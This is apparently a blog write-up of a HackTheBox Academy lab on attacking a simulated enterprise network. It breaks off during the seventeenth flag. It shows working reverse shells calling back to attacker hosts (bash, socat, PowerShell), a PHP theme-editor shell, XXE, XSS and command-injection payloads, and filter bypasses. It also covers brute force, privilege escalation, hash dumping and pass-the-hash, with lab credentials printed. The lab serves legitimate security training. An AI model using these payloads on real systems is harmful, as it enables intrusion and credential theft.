---
title: Attacking Enterprise Networks
date: 2025-03-14 00:00:01 +0800
categories: [HTBAcademy]
tags: [CPTS]
---
Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It combines all of the concepts from previous modules and best emulates the 10-day black-box penetration test expected to be taken as an exam after completing said modules. It is best advised to attack this module blind as preparation for the exam. 

We are given a target IP, a domain, and a VPN connection to start with. 

### First Flag:

The first flag was found using the following dig command to request a DNS zone transfer from the target ip:

```sh
dig axfr inlanefreight.local @10.129.229.147
```

Output:
```
; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local. 86400 IN SOA ns1.inlanfreight.local. dnsadmin.inlanfreight.local. 21 604800 86400 2419200 86400
inlanefreight.local. 86400 IN NS inlanefreight.local.
inlanefreight.local. 86400 IN A 127.0.0.1
blog.inlanefreight.local. 86400 IN A 127.0.0.1
careers.inlanefreight.local. 86400 IN A 127.0.0.1
dev.inlanefreight.local. 86400 IN A 127.0.0.1
flag.inlanefreight.local. 86400 IN TXT "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN A 127.0.0.1
ir.inlanefreight.local. 86400 IN A 127.0.0.1
status.inlanefreight.local. 86400 IN A 127.0.0.1
support.inlanefreight.local. 86400 IN A 127.0.0.1
tracking.inlanefreight.local. 86400 IN A 127.0.0.1
vpn.inlanefreight.local. 86400 IN A 127.0.0.1
```

---

(note that the target ip address can change because the target machine will shut down after a period of time on HackTheBox and will need to be manually restarted, randomly changing the ip address)

There also may be some subdomains that are not included in the zone transfer. We then additionally fuzz for subdomains using ffuf:
```
ffuf -w SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.229.147 -H 'Host:FUZZ.inlanefreight.local'
```
We additionally get monitoring.inlanefreight.local as a subdomain.

### Second Flag:

The second flag was found by attempting an FTP login using the default anonymous credential:

```sh
ftp anonymous@ip
get flag.txt
cat flag.txt
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
```

I fuzzed for parameters with ffuf, I got this as result from the following command:
```
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://careers.inlanefreight.local:80/FUZZ?id=1 -fs (common size)
```
```
apply        [Status: 200, Size: 16408, Words: 5625, Lines: 265, Duration: 84ms]
login        [Status: 200, Size: 9459, Words: 2752, Lines: 187, Duration: 159ms]
profile      [Status: 200, Size: 10148, Words: 3146, Lines: 195, Duration: 159ms]
register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
```

### Third Flag:
Then I browsed all the parameters and eventually got to http://careers.inlanefreight.local:80/register?id=1 to register an account with arbitrary credentials which authenticated me to the web server. I then was able view other profiles on http://careers.inlanefreight.local:80/profile?id=4 by adjusting the id parameter
which got me the third flag: HTB{8f40ecf17f681612246fa5728c159e46}

### Fourth Flag:
Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original GET request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to declare myself as an authorized ip address, which successfully got me onto the login.php website. 

Then, I see a file upload button and tried uploading a PHP web shell. It did not work since the uploader only allowed img/png files. I uploaded a test png file and recorded the HTTP POST request on BurpSuite. I changed the JPG code to the php web shell code, and then sent it again on BurpSuite to the site. This is successful and gave me a response saying that file was uploaded to /uploads/screenshot.png:![image tooltip](/images/Screenshot1.png)

I tried to execute commands with the png file through executing the command on the url: http://dev.inlanefreight.local/uploads/screenshot.png?cmd=id , however it does not work since screenshot.png is a png file so it will not execute as a php file. I then changed the file extension on BurpSuite to screenshot.php and then uploaded the file using the POST request above. This works, and I was able to get remote code execution with http://dev.inlanefreight.local/uploads/screenshot.php?cmd=id

Then I checked the entire directory for a flag.txt using a find command, but since this is a web shell, I will have to url encode the command:
find / -type f -name "*flag.txt*" 2>/dev/null becomes find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull.

After typing the command on the web browser as 

http://dev.inlanefreight.local/uploads/screenshot.php?cmd=find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull,

I get a flag.txt file at the directory /var/www/html/flag.txt. 

Using another url encoded command cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt,

we get HTB{57c7f6d939eeda90aa1488b15617b9fa} as the 4th flag.

### Fifth Flag:

Since we now have remote code execution through the web shell, we will attempt to upgrade the web shell to a fully interactive shell. 

I tried a variety of reverse shell one liners to connect to my local netcat listener and got this bash one liner shell to work: bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'

I URL-encoded the bash one liner and entered it on the url with my netcat listener active and got a working bash shell. I tried to escalate the shell to a fully interactive shell but was unsuccessful so I went ahead and looked at the other subdomains.

I went to ir.inlanefreight.local and I see that it is a wordpress site. I installed wpscan from the github repository and ran it against the url with 
wpscan --url http://ir.inlanefreight.local -e u --no-banner --api-token (api token from wpscan.com)

Got an interesting user called ilfreightwp from the above scan. I ran a bruteforce password attack using wpscan with 
wpscan --url http://ir.inlanefreight.local -P SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500

and I got the password password1 for the user ilfreightwp. 

Logging into WordPress, we try the theme editor attack where we inject a php reverse shell one liner using bash with <?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>

and then inserting it into one of the themes php files. We then start our netcat listener and activate the theme to receive the bash shell. After using a find command, we find the 5th flag in the /var/www/html directory: HTB{e7134abea7438e937b87608eab0d979c}

### Sixth Flag:

Next we move onto status.inlanefreight.local. I see that there is a text box on the website so I attempted a sql injection with ' OR 1=1 --. It did not seem to work but it did throw a SQL error message on BurpSuite repeater. I saved the HTTP request as a file and then input it into sqlmap with the command "sqlmap -r sqlmap1 --batch --dump --level 5 --risk 3" with sqlmap1 as the HTTP request file. 

The command gives us this table:
```
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
```

and we get the 6th flag: 1fbea4df249ac4f4881a5da387eb297cf

### Seventh Flag:
For tracking.inlanefreight.local, we try to list out potential filesystems with a javascript command using XMLHttpRequest():
```
<script>
    var files = ["/etc/", "C:/Windows/", "C:/Users/", "/home/", "/var/www/"];
    files.forEach(function(path) {
        var x = new XMLHttpRequest();
        x.onload = function() { document.write(path + " exists<br>"); };
        x.onerror = function() { document.write(path + " not accessible<br>"); };
        x.open("GET", "file:///" + path, true);
        x.send();
    });
</script>
```

When we paste this command into the text prompt, we get the output "/etc/ not accessible". Since we see that XMLHttpRequest gets us a response, we can create a request that tries to read a flag.txt from the filesystem if it exists:

```
<script>
    x = new XMLHttpRequest;
    x.onload = function() { document.write(this.responseText); };
    x.open("GET", "file:///flag.txt");
    x.send();
</script>
```

This works, and gets us our 7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}

### Eighth Flag:

Next target will be gitlab.inlanefreight.local.

We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the 8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}

### Ninth Flag:

We also have access to a website repository called shopdev2.inlanefreight.local. Upon visiting we see fields for admin username and password. Surprisingly, it has the default credentials username "admin" and password "admin." When visiting "my cart" at the url shopdev2.inlanefreight.local/cart.php, we see that there is backend processing since we get an HTTP response back from BurpSuite after we press complete purchase:
```
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 102
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=l6fdrpcqpv9rru1akat4ddicj6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<root>
<subtotal>
	undefined
</subtotal>
<userid>
	1206
</userid>
</root>
```
Since the website accepts XML input, we can try an XXE injection by inserting a DOCTYPE tag nested with an ENTITY tag looks in the filesystem for a flag.txt using SYSTEM level privileges. Since we get XML output from the variable userid, we can attempt to insert a Document Type Definition using DOCTYPE, where we can define an arbitrary ENTITY, in this case "xxetest" which calls a system level command "file:////flag.txt." If we insert the entity in the field of userid, if the website has outdated XML libraries or does not sanitize/filter XML input, the entity in userid will be output back to us in the form of the command output of "file:////flag.txt" which will give us the value of the flag.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
<!ENTITY xxetest SYSTEM "file:////flag.txt">
]>
<root>
<subtotal>
	undefined
</subtotal>
<userid>
	&xxetest;
</userid>
</root>
```
After sending this altered code in repeater, we successfully get the 9th flag as shown below:
```
<!HTTP/1.1 200 OK
Date: Sat, 22 Mar 2025 02:32:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 81
Content-Type: text/html; charset=UTF-8
Via: 1.1 shopdev2.inlanefreight.local
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

User: HTB{dbca4dc5d99cdb3311404ea74921553c}
 <br>Checkout Process not Implemented
 ```
### Tenth Flag:
We then move on to the next subdomain monitoring.inlanefreight.local. The page appears to be a simple username and password portal with the login button. One look at BurpSuite and we see that the website returns the variables username= and password=. We can try using hydra to brute force this login form's admin account with the command: 
```
hydra -L SecLists/Usernames/Names/names.txt -P SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials"
```
We then get admin as the username and 12qwaszx as the password after around 15 minutes. 

Once we login, we see that it takes us to a limited linux GUI. With the help command, we are able to see all the commands we can run. We notice that there is a command called "connection-test" which throws a "success" after you run it. We try to capture this processing through BurpSuite. 
```
GET /ping.php?ip=127.0.0.1 HTTP/1.1
Host: monitoring.inlanefreight.local
```
From here we see that it calls the ping.php file with the parameter ip which most likely pings the ip. Let's try to add an AND statement with urlencoded characters like &&,;, and the newline character. The newline character works if we substitute the HTTP header with 
```
GET /ping.php?ip=127.0.0.1%0als HTTP/1.1
Host: monitoring.inlanefreight.local
```

If we replace the original GET request with above, we get the following result in Burp repeater:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
00112233_flag.txt
css
img
index.php
js
login.php
ping.php
```

Now I try to cat the flag.txt file, however it is giving me invalid command. I assume that the space characters are being filtered on the backend, so we try %09 tab character as an alternative. It works, and we get the 10th flag: 
HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}

### Eleventh Flag:

Since we have command execution, we can try using a reverse shell. I tried the following url encoded command on BurpSuite:
```
127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A%2Fb'i'n%2Fbash
```
This did not seem to work. I tested similar commands a couple of times and realized that the backend may be blocking %2F or the "/" command to prevent calling on directories. I instead used the obfuscation method "${PATH:0:1}" which is equivalent to "/".

Now the command becomes
```
127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A${PATH:0:1}b'i'n${PATH:0:1}bash
```
and we successfully get a basic reverse shell connection on our attack box. 

Now we try to upgrade our socat shell to a fully interactive shell. We do this by using another netcat listener on the terminal with the command
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.41:4442
```
After we get the fully interactive reverse shell, we see that we are the "webdev" user on a machine called "dmz01." We cycle through the user profiles in the /home directory and get our 11th flag from the "srvadm" user's home directory:
```
b447c27a00e3a348881b0030177000cd
```
### Twelveth Flag:

For the twelveth flag, unfortunately I had to refer to the Attacking Enterprise Networks module as I was not able to make any ground myself. From the module, we learn that if we have control over an adm user, in this case we have webdev which is close enough, we can use aureport to read audit logs which may have saved the command line history in plaintext. 
```
aureport --tty | less
```
From this command, we see "ILFreightnixadm!" as the password for the srvadm account. We then switch to the srvadm account and try to find the flag:
```
find / -type f -iname "*flag*" 2>/dev/null
```
and we see the directory /srv/ftp/flag.txt and get the 12th flag: HTB{0eb0ab788df18c3115ac43b1c06ae6c4}

### Thirteenth Flag:

There is probably a flag in /root but unfortunately I can't cd to /root as the srvadm. I check my sudo -l privileges and see the following:
```
User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```
Since we have sudo command on /usr/bin/openssl, we will check GTFOBINS for an exploit. There is a sudo exploit on GTFOBINS, but it did not work in getting me root access. I used the below command to display the id_rsa file in the root folder using openssl with root privilege.
```
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
```
The first declares the LFILE variable as the ssh private key id_rsa under the root directory. 
The second exploits the openssl sudo privilege to encrypt the ssh private key with "-in $LFILE" to use the file path specified by the environment variable $LFILE. 
```
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
```
Not sure if it is necessary to call the LFILE variable, as the command above also works in retrieving the private key. Now we can use the SSH private key to authenticate as root:
```
ssh -i id_rsa root@(ip)
```
Now we can browse to the /root directory and concatenate the Thirteenth flag:
```
a34985b5976072c3c148abc751671302
```
### Fourteenth Flag:
Since we have root access on the machine, we can now focus in pivoting to other networks. 
We do netstat -r and notice that we are on three subnets: 10.129.0.0/16, 172.16.0.0/16, 172.17.0.0/16, and 172.18.0.0/16. We use msfvenom to generate a .elf reverse shell script for DMZ01 using the following command:
```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(localip) LPORT=(localport) -f elf > shell.elf
```
We then use scp to transfer this shell.elf file to DMZ01:
```
sudo scp -i id_rsa shell.elf root@(ip)
```
After that's done, we go into msfconsole and use multi/handler to set up a reverse shell listener. 
```
USE multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST (ip)
set LPORT (port)
run
```
Then run ./shell.elf as root on DMZ01 to get the reverse shell.

Once that's done, background the meterpreter session you get on msfconsole and then use post/multi/manage/autoroute, set session and subnet, and run. 
```
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
```
You can then check routes with the "route" command on msfconsole.

Next we setup proxychains for firewall evasion:
```
sudo apt-install proxychains
vim /etc/proxychains.conf
socks4  127.0.0.1 9050
```
Then use dynamic port forwarding to ssh to DMZ01 to utilize the proxychains servers.
```
ssh -D 9050 -i id_rsa root@(ip)
```
We can also test if proxychains is working by testing a proxychains nmap scan, be careful because proxychain nmap scans may only work with the subcommands -Pn to prevent pinging the target as officially proxychains does not support ICMP, only TCP, and -sT for TCP connect scanning. 
```
proxychains nmap -sT -Pn (ip)
```
After verifying proxychains is working, we create a new shell.elf file but this time making the local port 9050, which is the port for the proxychains servers. We then use multi/handler to create a TCP listener on msfconsole and execute the shell.elf file on DMZ1. After getting meterpreter, we background the session and use multi/gather/ping_sweep and use the subnet 172.16.0.0/16 172.17.0.0/16 172.18.0.0/16 as the RHOSTS as well as set the meterpreter session number. 
We then run the ping sweep and wait a while for it to return hosts:
```
[*] Performing ping sweep for IP range 172.16.0.0/16
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found

[*] Performing ping sweep for IP range 172.17.0.0/16
[+] 	172.17.0.2 host found
[+] 	172.17.0.1 host found

[*] Performing ping sweep for IP range 172.18.0.0/16
[+] 	172.18.0.3 host found
[+] 	172.18.0.8 host found
[+] 	172.18.0.7 host found
[+] 	172.18.0.6 host found
[+] 	172.18.0.5 host found
[+] 	172.18.0.2 host found
[+] 	172.18.0.9 host found
[+] 	172.18.0.4 host found
[+] 	172.18.0.1 host found
[+] 	172.18.0.10 host found
[+] 	172.18.0.11 host found
[+] 	172.18.0.12 host found

[*] Performing ping sweep for IP range 10.129.0.0/16
[+] 	10.129.0.1 host found
[+] 	10.129.1.43 host found
[+] 	10.129.1.168 host found
[+] 	10.129.2.47 host found
[+] 	10.129.2.48 host found
[+] 	10.129.2.80 host found
[+] 	10.129.2.219 host found
[+] 	10.129.3.171 host found

```
After finding all these hosts, we create a text file containing all of these ip addresses and then use the nmap command with -iL to enumerate all of these hosts.
```
sudo proxychains nmap -sT -Pn -iL nmaphosts.txt (ip)
```
I then upload the static nmap binary and the list of hosts text file to DMZ01 and then nmap scan on DMZ01. 
```
./nmap --open -iL live_hosts 

SYN Stealth Scan Timing: About 100.00% done; ETC: 19:48 (0:00:00 remaining)
Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00046s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B0:0D:49 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B0:51:4C (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00055s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B0:48:B7 (Unknown)
```
We see that 172.16.8.3 is most likely the domain controller because we see Kerberos and LDAP as open ports. 
For 172.16.8.20, we are interested in the HTTP service port 80 as well as the NFS service on port 2049.
For 172.16.8.50, we are interested in the HTTP service on port 8080.

We use the following commands to attempt to mount the NFS share from 172.16.8.20:
```
mkdir target-NFS
sudo mount -t NFS (ip):/ ./target-NFS -o nolock
cd target-NFS
```
Then we see the DEV01 share that has a flag.txt file and finally we find the Fourteenth Flag: bf22a1d0acfca4af517e1417a80e92d1.

### Fifteenth Flag:
In the DNN Directory of DEV01 share, we also see cleartext administrator credentials in the web.config file:
```
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
```
From web.deploy.config, we also see a potential SQL database called "MyDB"

We now try to get on the website of 172.16.8.20. We use:
```
proxychains firefox 172.16.8.20
```
However it does not seem to load. The problem was probably that SOCKS4 proxychains was not supported, so we change to the newer SOCKS5 which has UDP and authentication support by changing socks4 to socks5 in proxychains.conf. 
We then rerun the above command. We also change the browser network settings for firefox to manual proxy with the loopback address and port set for SOCK5. 

We then try to get to the login page of 172.16.8.20 since we have administrator credentials to test. It seems very slow to load.
We enter the credentials below and then 
```
Administrator
D0tn31Nuk3R0ck$$@123
```
The site loads super slowly and eventually times me out. I see that on the root host, I was getting a lot of channel open failed, so I see that SSH port forwarding is not working well. I then decide to try using Chisel HTTP tunneling instead of pure SSH port forwarding. I downloaded the Chisel binary from GitHub, scp'd it to the root user's directory on DMZ01, and set up a SOCKS5 tunnel with Chisel using DMZ01 as the Chisel server and my attack box as the Chisel client using the similar commands as below:
```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

TheControlDevil@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```
We also make sure that we have socks5 127.0.0.1 1080 in our /etc/proxychains.conf file since 1080 is the default port for Chisel and SOCKS non-tor proxies. We also have to set up a manual proxy in network settings in our firefox browser, listing our loopback address and the 1080 port. After this, we do proxychains firefox 172.16.8.20 again and see that we have no lag connecting to the website and entering in our credentials after upgrading our pure SSH tunnel to a Chisel tunnel. 

First thing that was interesting to me was the SQL console. We try to inject the following commands to get a xp_commandshell:
```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```
Then we run
```
xp_cmdshell 'whoami'
```
and successfully get RCE:
```
nt service/mssql$sqlexpress
```
We now run a privilege check with whoami /priv and get:
```
Privilege Name Description State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled 
```
We got something big, SeImpersonatePrivilege enabled should definitely be exploitable. The file upload function on the SQL console does not work, so we try using Site Manager to upload a shell.aspx file to get a webshell. We actually have to rename the shell.aspx file to a name other than shell as the file will not upload due to the backend stopping any files named "shell" from uploading. After uploading the webshell, we can copy the file url and browse to it.

We check the webshell machine on 172.16.8.20 and see that the hostname is ACADEMY-AEN-DEV with OS name Windows Server 2019 Standard and OS version 10. This means that its likely vulnerable to the PrintSpoofer.exe vulnerability which escalates shell privilege to SYSTEM. 

Now that we know we have SeImpersonate privilege and that the Windows, we can use PrintSpoofer.exe and nc.exe to create a SYSTEM privilege reverse shell:
```
PrintSpoofer.exe -i -c cmd

C:/WINDOWS/system32>whoami
nt authority/system
```
We download PrintSpoofer64.exe and nc64.exe as the 64-bit distribution, as a simple check with the command 
"wmic os get osarchitecture" lets us know that the DEV machine is 64bit. We then upload these files in file-management and see that they are located in http://172.16.8.20/Portals/0/Templates/ but we still do not know the exact file path of these files. 

Since we already have webshell RCE, we can try using a powershell reverse-shell to upgrade the webshell. On DMZ01, the ip address for the webshell should be 172.16.8.120 since it is in the same /24 subnet as 172.16.8.20 the DEV host. 
The PS reverse shell that worked for me:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',4443);$stream = $client.GetStream();[byte[]]$bytes = 0 .. 65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Now we successfully have a PS reverse shell. We can use a powershell Get-ChildItem command to see where our uploaded files PrintSpoofer.exe and nc64.exe went by searching the entire directory:
```
Get-ChildItem -Path C:/ -Filter nc64.exe -Recurse -ErrorAction SilentlyContinue
```
We now see that they are all located here:
```
C:/DotNetNuke/Portals/0/Templates
```
We now can cd to the directory and launch PrintSpoofer64.exe to run an elevated SYSTEM command, and we can also choose to run an elevated SYSTEM command that gives us a full SYSTEM reverse shell using nc64.exe:
```
c:/DotNetNuke/Portals/0/Templates/PrintSpoofer64.exe -c "c:/DotNetNuke/Portals/0/Templates/nc64.exe 172.16.8.120 4442 -e cmd"
```
We now successfully get SYSTEM privilege on the ACADEMY-AEN-DEV machine. After getting SYSTEM, we extract the 3 registry hives:
```
reg save HKLM/SYSTEM SYSTEM.SAVE
reg save HKLM/SECURITY SECURITY.SAVE
reg save HKLM/SAM SAM.SAVE
```
After saving this to the Templates directory, we do not see the files on the file management system which means that the file extension .SAVE needs to be allowed in the Security settings in order for the user to see the files. After adding .SAVE, we now can see the registry hives and download them to our attack box. 

Now make sure you have impacket installed with the command python3 -m pipx install impacket.
Then we run secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
to extract NTLM hashes:
```
[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:c2867b38e5a7653355419755b585433a004809c6a63fd834a105e8ba225e844ea69a1dbb7c8be6da8b955d7593f0a6e797ac99813a8d2fc92b037d609fc8f6d830c3dd202fbb038c979504896fdf8360df86cf6728ddb49421104ac94a772f37dba534962171ea8b47416849c35f4cd68e88364742741f888a8c24ada5177206e4a874d5a063a6d545f8e50ee5dfa42a1838d2a94757e6b5ab2d2f0b9d4ef5faf55333ced5e003c616554cafec674eade669c66c4631c6b9c33cc6ab40fc926db33bc801bbb26a7aca6ac42face72eb5647c890f478cc353b27e5c7bed305343bedb652456c10c7c88a4b76ac56731a8
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:92fddd46508b3a41d7e1e99ffcb17efa
[*] DefaultPassword 
(Unknown User):Gr8hambino!
```
We now have the NTLM hash for the Administrator account: 0e20798f695ab0d04bc138b22344cea8, we try to crack it with hashcat and rockyou.txt wordlist:
```
sudo hashcat -m 1000 hash.txt rockyou.txt
```
Unfortunately our wordlist was too weak to crack the password, so we can try using a pass-the-hash attack with netexec from DMZ01:
```
proxychains netexec smb 172.16.8.20 --local-auth -u Administrator -H 0e20798f695ab0d04bc138b22344cea8
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV/Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
```
I tried installing crackmapexec first, but no matter which way I installed it or ran the command it would not work, possibly because the repository is abandoned and left unupdated. I found NetExec which seems to be a working updated fork. 

Now we know that we can successfully authenticate with a pass-the-hash attack. We use Evil-WinRM to easily authenticate to the DEV host:
```
proxychains evil-winrm -i 172.16.8.20 -u Administrator -H 0e20798f695ab0d04bc138b22344cea8
```
Now that we have SYSTEM, we can do a Windows find command to search for flag files:
```
Get-ChildItem -Path C:/ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*flag*" }

C:/Users/Administrator/Desktop
C:/Share
```
Then, we finally get the 15th flag from C:/Users/Administrator/Desktop:
```
K33p_0n_sp00fing!
```
### Sixteenth Flag:
Easy flag, it is located at C:/Share/flag.txt.
```
bf22a1d0acfca4af517e1417a80e92d1
```

### Seventeenth Flag:
From the hashdump, we found (Unknown User):Gr8hambino!, we potentially can find the username using netexec (formerly crackmapexec) and we do along with additional data:
```
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV/Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumping LSA secrets
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:6791ba2d6b86986e2aecd4c1c06980b52840cbc3242f42cbe9d57caf02761fa7
